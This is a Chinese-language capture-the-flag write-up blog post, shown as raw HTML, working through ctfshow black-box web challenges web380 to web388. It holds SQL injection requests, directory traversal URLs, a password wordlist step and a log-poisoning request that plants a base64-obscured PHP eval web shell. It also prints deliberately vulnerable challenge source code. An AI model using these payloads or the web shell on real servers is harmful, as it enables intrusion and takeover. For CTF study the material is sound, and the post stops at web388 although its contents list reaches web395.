<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="web380扫描器没扫出东西，看视频提示 page.php 文件包含，居然是脑洞出来的   page.php12345678910&lt;?php#error_reporting(0);$id &#x3D; $_GET[&amp;#x27;id&amp;#x27;];if(!isset($id))&amp;#123;	die(&amp;#x27;打开$id.php失败&amp;#x27;);&amp;#125;else&amp;#123;	$html &#x3D; fil">
<meta property="og:type" content="article">
<meta property="og:title" content="Practice - CTFSHOW WEB入门 黑盒测试篇">
<meta property="og:url" content="https://blog.477.moe/2022/06/29/ctfshow-web-getting-started-black-box/index.html">
<meta property="og:site_name" content="Recharging Runtime">
<meta property="og:description" content="web380扫描器没扫出东西，看视频提示 page.php 文件包含，居然是脑洞出来的   page.php12345678910&lt;?php#error_reporting(0);$id &#x3D; $_GET[&amp;#x27;id&amp;#x27;];if(!isset($id))&amp;#123;	die(&amp;#x27;打开$id.php失败&amp;#x27;);&amp;#125;else&amp;#123;	$html &#x3D; fil">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2022-06-29T00:09:35.000Z">
<meta property="article:modified_time" content="2022-06-29T08:17:05.052Z">
<meta property="article:author" content="b_y">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Practice">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Practice - CTFSHOW WEB入门 黑盒测试篇</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/true" title="Recharging Runtime" type="application/atom+xml" />
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 5.4.1"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post" href="/2022/06/26/ctfshow-web-getting-started-xxe/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.477.moe/2022/06/29/ctfshow-web-getting-started-black-box/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.477.moe/2022/06/29/ctfshow-web-getting-started-black-box/&text=Practice - CTFSHOW WEB入门 黑盒测试篇"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.477.moe/2022/06/29/ctfshow-web-getting-started-black-box/&title=Practice - CTFSHOW WEB入门 黑盒测试篇"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.477.moe/2022/06/29/ctfshow-web-getting-started-black-box/&is_video=false&description=Practice - CTFSHOW WEB入门 黑盒测试篇"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Practice - CTFSHOW WEB入门 黑盒测试篇&body=Check out this article: https://blog.477.moe/2022/06/29/ctfshow-web-getting-started-black-box/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.477.moe/2022/06/29/ctfshow-web-getting-started-black-box/&title=Practice - CTFSHOW WEB入门 黑盒测试篇"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.477.moe/2022/06/29/ctfshow-web-getting-started-black-box/&title=Practice - CTFSHOW WEB入门 黑盒测试篇"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.477.moe/2022/06/29/ctfshow-web-getting-started-black-box/&title=Practice - CTFSHOW WEB入门 黑盒测试篇"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.477.moe/2022/06/29/ctfshow-web-getting-started-black-box/&title=Practice - CTFSHOW WEB入门 黑盒测试篇"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.477.moe/2022/06/29/ctfshow-web-getting-started-black-box/&name=Practice - CTFSHOW WEB入门 黑盒测试篇&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.477.moe/2022/06/29/ctfshow-web-getting-started-black-box/&t=Practice - CTFSHOW WEB入门 黑盒测试篇"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web380"><span class="toc-number">1.</span> <span class="toc-text">web380</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web381"><span class="toc-number">2.</span> <span class="toc-text">web381</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web382-383"><span class="toc-number">3.</span> <span class="toc-text">web382-383</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web384"><span class="toc-number">4.</span> <span class="toc-text">web384</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web385-386"><span class="toc-number">5.</span> <span class="toc-text">web385-386</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web387"><span class="toc-number">6.</span> <span class="toc-text">web387</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web388"><span class="toc-number">7.</span> <span class="toc-text">web388</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web389-395"><span class="toc-number">8.</span> <span class="toc-text">web389-395</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Practice - CTFSHOW WEB入门 黑盒测试篇
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">b_y</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-06-29T00:09:35.000Z" itemprop="datePublished">2022-06-29</time>
        
        (Updated: <time datetime="2022-06-29T08:17:05.052Z" itemprop="dateModified">2022-06-29</time>)
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-link-link" href="/tags/Practice/" rel="tag">Practice</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="web380"><a href="#web380" class="headerlink" title="web380"></a>web380</h2><p>扫描器没扫出东西，看视频提示 page.php 文件包含，居然是脑洞出来的  </p>
<figure class="highlight php"><figcaption><span>page.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$id</span>))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;打开$id.php失败&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$html</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$id</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$html</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码执行也没有，还要脑洞 flag 在 flag.php<br>索然无味</p>
<h2 id="web381"><a href="#web381" class="headerlink" title="web381"></a>web381</h2><p>道理题。。。要注意 css 的目录  </p>
<figure class="highlight html"><figcaption><span>/alsckdfy/</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这就是后台地址，给你ctfshow&#123;2a930d19-ac4f-4a0f-9de5-ff11cafe2a8d&#125;</span><br></pre></td></tr></table></figure>
<p>smjb</p>
<h2 id="web382-383"><a href="#web382-383" class="headerlink" title="web382-383"></a>web382-383</h2><p>上题的后台地址，是个登录，随便测了几个 sql 注入突然就爆 flag 了，什么鬼  </p>
<figure class="highlight http"><figcaption><span>raw</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/alsckdfy/check.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>e78525a7-8691-4ed9-b923-521a31232c01.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>43</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://e78525a7-8691-4ed9-b923-521a31232c01.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://e78525a7-8691-4ed9-b923-521a31232c01.challenge.ctf.show/alsckdfy/check.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>UM_distinctid=17eca237f064ad-05ba9f2afdfcf8-f791539-144000-17eca237f0779c; __e_inc=1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">p</span>=aaaaa&amp;u=aaaa%<span class="number">27</span>+union+select+<span class="number">1</span>%<span class="number">2</span>C2%<span class="number">2</span>C3%<span class="number">23</span></span></span><br></pre></td></tr></table></figure>


<h2 id="web384"><a href="#web384" class="headerlink" title="web384"></a>web384</h2><p>提示说</p>
<blockquote>
<p>密码前2位是小写字母，后三位是数字  </p>
</blockquote>
<p>于是我们生成字典 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ crunch 5 5 -t @@%%% -o wordlist.txt</span><br><span class="line">Crunch will now generate the following amount of data: 4056000 bytes</span><br><span class="line">3 MB</span><br><span class="line">0 GB</span><br><span class="line">0 TB</span><br><span class="line">0 PB</span><br><span class="line">Crunch will now generate the following number of lines: 676000</span><br><span class="line"></span><br><span class="line">crunch: 100% completed generating output</span><br></pre></td></tr></table></figure>
<p>这么多，做这道题的时候 ctf。show 已经限制了高并发请求，10 并发都会 503 全爆破时间成本不值得，于是直接看视频可知爆破结果是 xy123<br>这里前两题由于不是弱密码做的，并不知道用户名是 admin，还应该算个脑洞吧  </p>
<h2 id="web385-386"><a href="#web385-386" class="headerlink" title="web385-386"></a>web385-386</h2><p>目录穿越，二次安装密码重置<br>/page.php?id=../../../../../../../../var/www/html/page  </p>
<figure class="highlight php"><figcaption><span>page.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$id</span>))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;打开page_$id.php失败&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$html</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;page_&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$html</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>/page.php?id=../../../../../../../../var/www/html/install/index</p>
<figure class="highlight php"><figcaption><span>install/index.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$dbhost</span> =<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpwd</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;ctfshow&quot;</span>;</span><br><span class="line"><span class="variable">$charName</span> = <span class="string">&quot;utf-8&quot;</span>; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;请务必在安装成功后删除本文件&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;需要重新安装请访问install/?install,管理员密码将重置为默认密码&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;install&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title class_">mysqli</span>(<span class="variable">$dbhost</span>,<span class="variable">$dbuser</span>,<span class="variable">$dbpwd</span>,<span class="variable">$dbname</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_connect_errno</span>())&#123;</span><br><span class="line">	 	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="title function_ invoke__">mysqli_connect_error</span>())));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">&quot;update admin_user set username=&#x27;admin&#x27;,password=&#x27;admin888&#x27; where username=&#x27;admin&#x27;;&quot;</span>;</span><br><span class="line">	<span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;安装成功，请立即删除本文件&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>/page.php?id=../../../../../../../../var/www/html/alsckdfy/check</p>
<figure class="highlight php"><figcaption><span>alsckdfy/check.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;ctfshow&#123;00335eef-0a54-4767-81c0-0a0961038993&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$u</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;u&#x27;</span>];</span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$u</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$p</span>))&#123;</span><br><span class="line">	<span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title class_">mysqli</span>(<span class="variable">$dbhost</span>,<span class="variable">$dbuser</span>,<span class="variable">$dbpwd</span>,<span class="variable">$dbname</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_connect_errno</span>())&#123;</span><br><span class="line">	 	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="title function_ invoke__">mysqli_connect_error</span>())));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;set name <span class="subst">$charName</span>&quot;</span>);</span><br><span class="line">	<span class="variable">$num</span> = <span class="number">1</span>;</span><br><span class="line">	<span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line">		<span class="string">&quot;count&quot;</span>=&gt;<span class="variable">$num</span>,</span><br><span class="line">		<span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">	);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[A-Za-z0-9]+$/i&#x27;</span>, <span class="variable">$u</span>))&#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">					&#125;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[A-Za-z0-9]+$/i&#x27;</span>, <span class="variable">$p</span>))&#123;</span><br><span class="line">					<span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">						&#125;</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">&quot;select id,username,password from admin_user where username = &#x27;&quot;</span>.<span class="variable">$u</span>.<span class="string">&quot;&#x27; and password = &#x27;&quot;</span>.<span class="variable">$p</span>.<span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">	<span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_object</span>())&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="web387"><a href="#web387" class="headerlink" title="web387"></a>web387</h2><p>先扫一下  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ python dirsearch.py -u http://c1f0db80-cdab-45d3-8797-ecdc7514af31.challenge.ctf.show/ -e php -t 5</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.0</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php | HTTP method: GET | Threads: 5 | Wordlist size: 7085</span><br><span class="line"></span><br><span class="line">Error Log: F:\tools\dirsearch\logs\errors-22-06-27_15-44-27.log</span><br><span class="line"></span><br><span class="line">Target: http://c1f0db80-cdab-45d3-8797-ecdc7514af31.challenge.ctf.show/</span><br><span class="line"></span><br><span class="line">Output File: F:\tools\dirsearch\reports\c1f0db80-cdab-45d3-8797-ecdc7514af31.challenge.ctf.show\_22-06-27_15-44-28.txt</span><br><span class="line"></span><br><span class="line">[15:44:28] Starting:</span><br><span class="line">[15:44:30] 200 -   12KB - /php</span><br><span class="line">[15:51:30] 200 -   12KB - /adminphp</span><br><span class="line">[15:57:10] 301 -  169B  - /debug  -&gt;  http://c1f0db80-cdab-45d3-8797-ecdc7514af31.challenge.ctf.show/debug/</span><br><span class="line">[15:57:12] 200 -   14B  - /debug/</span><br><span class="line">[15:59:25] 200 -   12KB - /index.php</span><br><span class="line">[15:59:36] 301 -  169B  - /install  -&gt;  http://c1f0db80-cdab-45d3-8797-ecdc7514af31.challenge.ctf.show/install/</span><br><span class="line">[15:59:40] 200 -   59B  - /install/</span><br><span class="line">[16:01:35] 200 -   12KB - /myadminphp</span><br><span class="line">[16:02:14] 200 -   24B  - /page.php</span><br><span class="line">[16:04:14] 200 -   15B  - /robots.txt</span><br><span class="line"></span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>
<p>robots.txt 指向 /debug，/debug?file= 文件包含写 shell  </p>
<figure class="highlight http"><figcaption><span>raw</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/debug/?file=/var/log/nginx/access.log</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>613bb736-8aa4-42e6-9623-b38f4038e838.challenge.ctf.show</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>&lt;?php file_put_contents(base64_decode(&#x27;L3Zhci93d3cvaHRtbC9zaGwucGhw&#x27;),base64_decode(&#x27;PD9waHAgQGV2YWwoJF9QT1NUWzFdKTsgPz4g&#x27;)) ?&gt;</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>UM_distinctid=17eca237f064ad-05ba9f2afdfcf8-f791539-144000-17eca237f0779c; __e_inc=1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>getshell 之后看源码  </p>
<figure class="highlight php"><figcaption><span>/debug/index.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$html</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;php -f &#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$html</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;file not exist&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>怪不得这里直接把 shell 写到日志是拿不到 $_POST 的  </p>
<h2 id="web388"><a href="#web388" class="headerlink" title="web388"></a>web388</h2><p>上题的 payload 通杀，这里没输出并不影响执行写 shell  </p>
